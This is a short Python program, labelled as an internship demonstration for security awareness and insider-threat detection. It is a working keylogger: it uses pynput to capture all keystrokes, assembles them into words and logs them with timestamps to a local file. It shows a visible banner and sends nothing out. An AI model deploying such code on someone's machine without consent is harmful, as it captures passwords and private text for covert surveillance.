"""
Word-Based Keystroke Logging Demonstration
For Security Awareness and Insider Threat Detection

Educational and ethical use only (Edunet-VOIS Internship).
"""

from pynput.keyboard import Key, Listener
from datetime import datetime
import platform

LOG_FILE = "keystrokes_words_log.txt"

current_word = ""

def initialize_log():
    with open(LOG_FILE, "a") as file:
        file.write("\n" + "=" * 60 + "\n")
        file.write(f"Session Started: {datetime.now()}\n")
        file.write(f"System: {platform.system()} {platform.release()}\n")
        file.write("=" * 60 + "\n")

def log_word(word):
    if word.strip() != "":
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(LOG_FILE, "a") as file:
            file.write(f"{timestamp}  WORD: {word}\n")

def on_press(key):
    global current_word

    try:
        # Normal character
        current_word += key.char
    except AttributeError:
        # Special keys
        if key == Key.space or key == Key.enter:
            log_word(current_word)
            current_word = ""
        elif key == Key.backspace:
            current_word = current_word[:-1]

def on_release(key):
    if key == Key.esc:
        # Log last word if exists
        log_word(current_word)
        with open(LOG_FILE, "a") as file:
            file.write(f"Session Ended: {datetime.now()}\n")
        print("Keystroke logging stopped.")
        return False

def main():
    print("=" * 60)
    print("Word-Based Keystroke Logging Started")
    print("Purpose: Security Awareness & Insider Threat Detection")
    print("Press ESC to stop logging")
    print("=" * 60)

    initialize_log()

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
